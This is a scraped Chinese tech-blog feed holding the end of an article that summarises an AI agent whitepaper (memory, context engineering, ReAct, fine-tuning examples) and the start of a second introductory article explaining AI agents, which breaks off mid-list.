<p>如图示例所示，用户查询“公司在北美的最新业务规模如何？”，智能体先检索财经报告和市场数据，然后在 ReAct 循环中利用这些检索结果进行综合推理和回答：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c7168be4f7e44bf942c28cfe405ebdf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943759&amp;x-signature=Jg0udHvWhQriSXlZDF6VJMjMso4%3D" alt="" loading="lazy"/></p>
<p>其实从这部分内容质量来说，Google的报告写得挺一般的，作为科普读物挺不错的...</p>
<h2 data-id="heading-8">记忆系统</h2>
<p>在Agent系统中，<strong>记忆层</strong>不仅负责保存上下文、支撑多轮对话，它更深层的职责，是回答这样一个问题：</p>
<blockquote>
<p>数据如何与AI交互，才能让大模型“真正理解任务”？</p>
</blockquote>
<p>这一问题的回答，近来常被包装为一个新术语：<strong>上下文工程（Context Engineering）。</strong></p>
<p>但从本质看，它仍是对“如何构造有效Prompt”的深化和结构化设计，是提示词工程在复杂任务落地场景下的自然演进。</p>
<h3 data-id="heading-9">上下文工程</h3>
<p>通常我们将 Agent 的记忆系统划分为两个层次：</p>
<p><strong>一、短期记忆（Short-Term Memory）</strong></p>
<p>指当前会话的上下文历史，包括用户输入、模型回复、中间推理痕迹；</p>
<p>多保存在编排层的对话状态中，用作 Prompt 上下文构建。</p>
<p><strong>二、长期记忆（Long-Term Memory）</strong></p>
<p>指跨会话的知识存储，如用户偏好、历史数据、组织内部资料、文档库等；</p>
<p>通常通过向量检索（RAG**）等方式动态取用，实现在运行时“补全知识”。</p>
<p>但真实场景中，记忆系统远不止“存+取”这么简单，它的核心目标是：</p>
<blockquote>
<p>为大模型提供“恰到好处”的信息，既不过多打扰模型，也不遗漏关键信息</p>
</blockquote>
<p>这引出了“上下文工程”的实操三难点：</p>
<ol>
<li><strong>拿得到吗？</strong> 检索逻辑是否合理，是否漏掉关键信息？</li>
<li><strong>拿得准吗？</strong> 内容是否相关？是否过多干扰模型或严重缺漏？</li>
<li><strong>用得对吗？</strong> 最终组织进 Prompt 的方式是否有效激发模型输出？</li>
</ol>
<p>从工程角度讲，上下文就像 Prompt 的RAM，容量有限但直接决定模型运行表现。设计合理的上下文组织策略，是Agent系统最重要的竞争力之一。</p>
<p>根据之前的经验，可以把上下文工程操作模式分为四类：</p>



































<table><thead><tr><th>手法</th><th>核心思路</th><th>类比</th><th>常见场景</th></tr></thead><tbody><tr><td><strong>1. 记录式（Write）</strong></td><td>让 AI 随时把重要细节写进“随身笔记”</td><td>人类做会议速记</td><td>ChatGPT 存用户常点外卖、偏好等</td></tr><tr><td><strong>2. 甄选式（Select）</strong></td><td>从资料中挑出最 relevant 的再喂给模型</td><td>图书管理员找指定章节</td><td>Code Agent 检索函数文件、知识点</td></tr><tr><td><strong>3. 精简式（Compress）</strong></td><td>当信息爆棚，用摘要、提炼、去冗余手段减轻模型负担</td><td>给论文写摘要</td><td>Claude 快满窗口时自动压缩历史对话</td></tr><tr><td><strong>4. 分隔式（Isolate）</strong></td><td>将复杂任务拆分给多个“助手”，各自记忆不同上下文</td><td>项目经理分派子任务</td><td>Swarm Agent 中多个子模型分工协作</td></tr></tbody></table>
<p>这些方法的组合，构成了真正能用、能落地的上下文工程，其实大家也可以看出来了，<strong>尽管上下文工程、Agent的记忆系统听起来很屌，其本质还是复杂的提示词工程</strong>...</p>
<p>最后回归到 <strong>Agent ReAct 框架</strong>，我们再看看四大组件的关系：</p>
<h3 data-id="heading-10">ReAct 框架中的记忆层角色</h3>
<p>在ReAct框架中，每一个 Thought 的质量，严重依赖于CoT，而CoT又严重依赖于记忆系统提供的信息是否充足、是否准确、是否干扰最小。</p>
<p>在执行过程中，记忆系统负责为 Thought 构建上下文输入，即 Prompt 中的 Memory 区块。一个典型的 ReAct 调用链如下：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">User:</span> <span class="hljs-string">我需要找一张明天下午从北京去上海的高铁票</span>
<span class="hljs-string">-----------------</span>
<span class="hljs-attr">Thought:</span> <span class="hljs-string">我需要查询高铁票信息</span>
<span class="hljs-attr">Action:</span> <span class="hljs-string">查询高铁</span> <span class="hljs-string">API（输入城市和时间）</span>
<span class="hljs-attr">Observation:</span> <span class="hljs-string">返回多个班次和时间段</span>
<span class="hljs-attr">Thought:</span> <span class="hljs-string">我挑选一个下午出发、价格合适的车次</span>
<span class="hljs-attr">Action:</span> <span class="hljs-string">None</span>
<span class="hljs-attr">Final Answer:</span> <span class="hljs-string">为您找到两张明天下午从北京到上海的高铁票...（输出结果）</span>
</code></pre>
<p>在这个过程中：</p>
<ol>
<li>若之前用户已经表达过偏好如“只要一等座”、“不坐动车”等，长期记忆需要提供这些偏好信息；</li>
<li>若用户此前提过“和昨天流程一样”，短期记忆要准确提取那次会话内容；</li>
<li>若调用查询工具返回大量内容，记忆系统需判断提取哪些 Observation 塞入下一步 Prompt；</li>
</ol>
<p>从这里大家也可以看出ReAct的重要性和复杂度了，他是推动推理循环向前的基础。</p>
<p>另一方面，为什么说上下文工程是整套 Agent 架构最容易忽视、但最容易出问题的部分？因为它一旦做不好，模型生成的 Thought 将会是空转、偏离、或者幻觉的。</p>
<p>总而言之，这块是事实上的难点，大家好好体悟吧。</p>
<h2 data-id="heading-11">强化与训练</h2>
<p>模型发展了三年经历了三个时代：<strong>百模大战模型训练 → 套壳为荣，提示词工程 → CoT</strong>，也就是当前<strong>业内普遍对于模型训练是十分排斥的</strong>，这意味着技术负责人说出要训练，这笔预算可能会有很大的压力...</p>
<p>只不过，虽然基础模型已经具备强大的能力，但要让模型在特定Agent架构中发挥最佳效果，往往需要针对性地学习使用新工具和新知识。白皮书总结了三种主要方法：</p>
<p><strong>一、上下文内学习（In-context Learning）：</strong></p>
<p>在推理时为模型提供任务相关的提示、工具说明和少量示例，让模型“在线”学习如何使用工具。</p>
<p>例如，通过几个示例对话展示在类似场景下使用哪种工具、怎样调用，可提升模型的工具调用准确率。</p>
<p>ReAct 本身就是一种典型的上下文示例驱动的提示框架。</p>
<p><strong>二、检索式上下文学习（Retrieval-based In-context Learning）：</strong></p>
<p>自动检索<strong>和选择最相关的知识片段</strong>、示例或工具说明作为提示的一部分，从外部记忆库（如“示例存储”或知识库）中动态构造提示。</p>
<p>这类似于给模型“提供一本动的菜谱”：让它根据查询从知识库检索示例来指导决策。</p>
<p><strong>三、微调训练（Fine-tuning）：</strong></p>
<p>最后就是微调了，使用大量特定任务的示例数据对模型进行微调，可以更好的提高效果。比如，为客服智能体微调模型，让它学会优先调用知识库工具而不是直接“胡乱回答”。</p>
<p>这里是一些训练数据案例，大家感受下就好：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"context"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"【内部文档摘录】本公司标准退货政策为：自收货之日起 7 日内可无理由退货，超过 7 日不予受理。"</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"question"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你们退货政策是怎样的？"</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"answer"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"根据我们的标准退货政策，自收货之日起 7 日内您可以无理由退货，超过 7 日则无法办理退货。"</span>
<span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">{</span>
<span class="hljs-attr">"goal"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"帮用户规划一个 3 天的东京自由行，预算适中，喜欢美食和动漫文化。"</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"tools"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"search_flights"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"search_hotels"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"search_attractions"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
<span class="hljs-attr">"plan"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"steps"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"step_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"确定出发和返回日期，并查询往返机票选项"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"tool"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"search_flights"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"出发城市"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"东京"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"出发日期"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"返回日期"</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"step_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"根据预算和地理位置搜索酒店（优先新宿、涩谷附近）"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"tool"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"search_hotels"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"东京"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"3 晚"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"预算范围"</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"step_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"根据用户兴趣筛选景点（动漫文化、美食街）并按天分配"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"tool"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"search_attractions"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"inputs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"东京"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"动漫"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"美食"</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>

<span class="hljs-punctuation">{</span><span class="hljs-attr">"messages"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span><span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"system"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你是一个任务规划助手，收到用户目标后只输出 JSON 格式的任务拆解计划。"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-punctuation">{</span><span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"user"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"帮我规划一个 3 天的东京自由行，预算适中，我喜欢美食和动漫。"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"assistant"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"{"</span>steps<span class="hljs-string">": [\
      {"</span>step_id<span class="hljs-string">": 1, "</span>description<span class="hljs-string">": "</span>确认出发/返回日期并查询机票<span class="hljs-string">", "</span>tool<span class="hljs-string">": "</span>search_flights<span class="hljs-string">"},\
      {"</span>step_id<span class="hljs-string">": 2, "</span>description<span class="hljs-string">": "</span>根据预算和位置选择酒店<span class="hljs-string">", "</span>tool<span class="hljs-string">": "</span>search_hotels<span class="hljs-string">"},\
      {"</span>step_id<span class="hljs-string">": 3, "</span>description<span class="hljs-string">": "</span>为 <span class="hljs-number">3</span> 天分别安排景点和美食<span class="hljs-string">", "</span>tool<span class="hljs-string">": "</span>search_attractions<span class="hljs-string">"}\
    ]}"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span>
</code></pre>
<p>在生产环境上，这三个往往会混用。</p>
<h2 data-id="heading-12">结语</h2>
<p>白皮书后面还会涉及<strong>多Agent架构、高并发架构设计、安全</strong>等模块，稍微有些泛泛而谈，而我们今天定位如果是入门级内容的话就不去涉及了。</p>
<p>最后还是总结一下，这份Agent白皮书全面梳理了 AI Agent（智能体）技术架构的核心要素，他本身包含一部分实践技巧，但有点卖自己云服务的嫌疑，我们这里就不涉及了。</p>
<p>总之，希望本文对大家有用吧，作为入门级科普内容，我觉得他还是合格的。只是可惜又浪费我5个小时...</p>
<h2 data-id="heading-13">学习资源推荐</h2>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[下一个时代属于AI Agent！5分钟讲明白什么是Agent？]]></title>    <link>https://juejin.cn/post/7581760987763228723</link>    <guid>https://juejin.cn/post/7581760987763228723</guid>    <pubDate>2025-12-10T03:56:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581760987763228723" data-draft-id="7581760987763212339" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="下一个时代属于AI Agent！5分钟讲明白什么是Agent？"/> <meta itemprop="keywords" content="Agent,LLM,程序员"/> <meta itemprop="datePublished" content="2025-12-10T03:56:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型教程"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            下一个时代属于AI Agent！5分钟讲明白什么是Agent？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型教程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:56:09.000Z" title="Wed Dec 10 2025 03:56:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote>
<p>在使用AI的过程中，一个核心痛点也逐渐浮现：AI 非常聪明，但它只会停留在对话框里聊天和建议。 你让它完成一份复杂的市场调研，它只会给你一份大纲，却无法主动行动起来：自动搜索信息、整理数据、打开分析工具、撰写报告，并最终交付结果。</p>
<p>而Agent智能体让 AI 不再仅仅是会说的工具，而是真正拥有了自主行动力，能够目标驱动、自我规划、执行复杂任务，甚至组成虚拟团队进行协作。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/714358793927416f8e34845a8443e70f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943769&amp;x-signature=zsClKcY6Cbc3V0ZOmcrN8w2rTx8%3D" alt="" loading="lazy"/></p>
<p>那么，Agent 的本质到底是什么？它与我们熟悉的大模型之间，究竟是怎样的进化关系？为什么说它才是驱动下一波 AI 生产力革命的终极引擎？</p>
<p>将用 5 分钟的深度解析，带你彻底搞懂：Agent 的定义、工作原理、核心应用，以及它所开启的 AI 新时代。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e0770bdfdf64279afacdf21138f41ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943769&amp;x-signature=TK%2Bv%2BeVp7F1iwGKO7flLBTeCULA%3D" alt="" loading="lazy"/></p>
<p>要理解 Agent 的革命性，我们必须首先清晰界定它与 LLM** 之间的关系。它们绝非互相取代，而是一种核心能力的进化与叠加。</p>
<p>我们可以用一个最形象的比喻来区分它们：LLM 是大脑，而 Agent 是长了手脚的 AI 生命体。</p>
<p>大型语言模型（LLM）本质上是人类的智慧核心，它拥有强大的推理、知识和语言能力，但它缺乏与外部世界的交互机制，无法直接调用工具或执行操作。</p>
<p>而 Agent则是在这个 LLM 大脑的基础上，集成了感知、行动、记忆等模块，使其能够根据既定目标自主决策、调用工具、执行任务，并不断从环境中学习和改进。</p>
<p>简而言之，Agent 就是一个能够自主行动、解决问题的数字员工。</p>
<p>为了更清晰地理解这一飞跃，我们通过一张对比表来捕捉 LLM 与 Agent 的本质差异：</p>









































<table><thead><tr><th><strong>特性</strong></th><th><strong>LLM</strong> <strong>（大模型）</strong></th><th><strong>Agent</strong> <strong>（智能体）</strong></th><th><strong>意义</strong></th></tr></thead><tbody><tr><td><strong>角色定位</strong></td><td><strong>应答者</strong>（Responder）</td><td><strong>行动者</strong>（Executor）</td><td>从被动回答到主动执行，是能力范式的根本转变。</td></tr><tr><td><strong>核心能力</strong></td><td>语言理解、逻辑推理、内容生成</td><td><strong>自主规划、工具使用、目标驱动</strong></td><td>实现了从“会说”到“会做”的本质飞跃。</td></tr><tr><td><strong>目标设定</strong></td><td>依赖用户的 <strong>Prompt（提示词）</strong></td><td>根据宏大目标，<strong>自主拆解并执行</strong></td><td>使 AI 具备了持续工作和完成长期任务的能力。</td></tr><tr><td><strong>工具使用</strong></td><td>极少或不能调用外部工具</td><td><strong>能自主调用</strong> 搜索引擎、代码库、API等</td><td>突破了自身知识边界，实现无限扩展能力。</td></tr><tr><td><strong>记忆机制</strong></td><td>短期上下文记忆（Chat   Session）</td><td><strong>长期记忆</strong>（外置数据库），可用于反思学习。</td><td>能够积累经验，形成稳定且可迭代的人格。</td></tr></tbody></table>
<p>Agent 为什么能行动？秘密就在于其结构化组件的完美整合。我们将其核心能力提炼为一个简单的公式：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a7a1daca7014099ab92ffe6602302bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943769&amp;x-signature=5LwKlpHH2Xq2iXWU%2FP6szpZeVck%3D" alt="" loading="lazy"/></p>
<p>在这个结构中，LLM 是决策中心，负责思考和规划；记忆让它能累积经验，持续学习；而工具和行动则是其连接和改变现实世界的桥梁；最终，目标赋予了 Agent 永恒的驱动力。</p>
<p>举一个具体的例子来理解这种颠覆性差异： 同样一个做市场调研的任务，传统 LLM 只会基于内部知识给出文字建议。</p>
<p>而 Agent 会主动拆解目标，依次调用搜索引擎工具获取最新数据，调用代码解释器进行复杂数据分析，最终自主撰写报告并自动交付，完成一个全流程、闭环的行动。它不再是你的咨询顾问，而是你的数字执行官。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20b6587a83d54b9e83b4aebeb931f012~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943769&amp;x-signature=vLK8RJYxwi4Fv7BuZkVsCEZYcOc%3D" alt="" loading="lazy"/></p>
<p>Agent 之所以能实现自主性，是因为它并非线性执行命令，而是通过模拟人类的思维和行动机制，构建了一个严密的Agent Loop（智能体循环）。</p>
<p>这个循环的核心在于其五大模块的精密配合，使其具备了自我感知、自我规划、自我修正和自我学习的能力。</p>
<ol>
<li>
<p>感知与接收信息： Agent 首先通过其“感知”模块接收外界信息，无论是来自用户的复杂目标指令，还是外部环境（如网页数据、系统反馈）的最新变化，都是其行动的起点。</p>
</li>
<li>
<p>思考与规划（LLM核心）： 接收信息后，LLM 作为 Agent 的大脑立即启动，根据既定目标和当前状态进行深度推理，并将宏大目标拆解成一系列清晰、可执行的子步骤，这是 Agent 具备主动性的关键。</p>
</li>
</ol>
